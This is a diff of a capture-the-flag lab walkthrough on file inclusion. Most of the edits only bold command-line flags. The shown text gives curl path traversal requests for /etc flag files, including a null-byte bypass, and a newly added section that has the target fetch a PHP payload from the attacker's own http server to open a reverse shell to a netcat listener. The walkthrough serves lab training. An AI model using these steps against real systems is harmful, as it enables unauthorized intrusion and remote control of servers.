@@ -31,7 +31,7 @@ In this instance I will use Curl to generate the POST request and receive the fl
 
 ```curl http://MACHINE_IP/challenges/chall1.php -d "file=../../../../etc/flag1" ```  
 #### ⚙️ **Options**  
--d is used to set the data to send, in this case ```file=../../../../etc/flag1``` using the -d flag will default the request into a POST request.  
+**-d** is used to set the data to send, in this case ```file=../../../../etc/flag1``` using the -d flag will default the request into a POST request.  
   
 You should end up with something like the below  
 ![lab1 curl](./Images/lab1_curl.png)  
@@ -81,8 +81,8 @@ Which returned an error messaged indication that the output needed to be passed 
 
 ```curl http://MACHINE_IP/challenges/chall1.php -X POST -d "file=../../../../etc/flag3%00" -o file.txt```  
 #### ⚙️ **Options**    
--d is used to set the data to send with the POST request in this case ```file=../../../../etc/flag3%00``` using the -d flag will default the request into a POST request.  
--o is used to output the returned result into a file of the specified name and type.  
+**-d** is used to set the data to send with the POST request in this case ```file=../../../../etc/flag3%00``` using the -d flag will default the request into a POST request.  
+**-o** is used to output the returned result into a file of the specified name and type.  
 
 You should end up with something like the below  
 ![lab3 curl](./Images/lab3_curl.png)  
@@ -104,7 +104,7 @@ Open up your terminal and input ```echo "Hello World" > test.php``` This will cr
 Next we need to setup a http server in the same directory as our file which will be used to download the file onto the target. We can do this via the below  
 ```python3 -m http.server 8080```  
 #### ⚙️ **Options**  
--m option is used to tell python to search for and run a specific module in this instance the http.server module.  
+**-m** option is used to tell python to search for and run a specific module in this instance the http.server module.  
 
 Which would look like this  
 ![lab4_http_server](./Images/Lab4_http_server.png)  
@@ -154,7 +154,7 @@ Lets open up a blank file on our machine with your prefered text editor. I will 
 #### ⚙️ **Options**  
 Find the line starting with ```$ip```  
 **$ip** change this to be your attackbox or VM ip address  
-**$port*** Input a selected port that we will use for your listner.  
+**$port** Input a selected port that we will use for your listner.  
 
 This should look similar to the below.  
 ![flag4_shell](./Images/flag4_shell.png)  
@@ -178,3 +178,16 @@ These can all be combined into the string ```-lnvp``` followed by the required p
 
 This should look as below.  
 ![lab4_netcat](./Images/lab4_netcat.png) 
+
+Perfect now we have our payload set, our http server running to serve the payload and or listner going to wait for the reverse connection. Lets run the payload.  
+
+Navigate to the ```MACHINE_IP/playground.php?``` site and input the below into the address bar.
+```MACHINE_IP/playground.php?file=http://YOUR_MACHINE_IP:5050/rce.php```
+Which should look like the below  
+![lab4_url](./Images/lab4_url.png)
+
+If successful we should se a GET request was recived by our http server.  
+![lab4_http_server_manual](./Images/lab4_http_server_manual.png)  
+
+Our listner should have recived the reverse connetion. If succesful we can see the hosename in the initial connection details or type in ```hostname``` to capture our flag.
+![lab4_flag_manual](./Images/lab4_flag_manual.png)
